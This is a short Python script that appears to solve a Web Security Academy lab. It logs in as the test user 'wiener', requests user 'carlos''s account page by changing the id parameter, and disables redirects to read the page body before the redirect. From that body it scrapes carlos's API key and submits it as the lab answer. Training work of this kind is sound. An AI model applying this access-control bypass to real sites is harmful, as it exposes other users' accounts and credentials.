import requests
from bs4 import BeautifulSoup
import re

# Start session and site info
s = requests.Session()
site = '0a8b002203dc926382c125ff006d0048.web-security-academy.net'

# Step 1: Log in
login_url = f'https://{site}/login'
login_data = {'username': 'wiener', 'password': 'peter'}
s.post(login_url, data=login_data)

# Step 2: Access Carlos's account with allow_redirects=False
carlos_account_url = f'https://{site}/my-account?id=carlos'
resp = s.get(carlos_account_url, allow_redirects=False)

# Step 3: Extract the API key
soup = BeautifulSoup(resp.text, 'html.parser')
div_text = soup.find('div', string=re.compile('API')).text
api_key = div_text.split(' ')[4]
print(f"API Key: {api_key}")

# Step 4: Submit the API key
submit_url = f'https://{site}/submitSolution'
resp = s.post(submit_url, data={'answer': api_key})

# Step 5: Confirm result
print(resp.status_code)
print(resp.text)
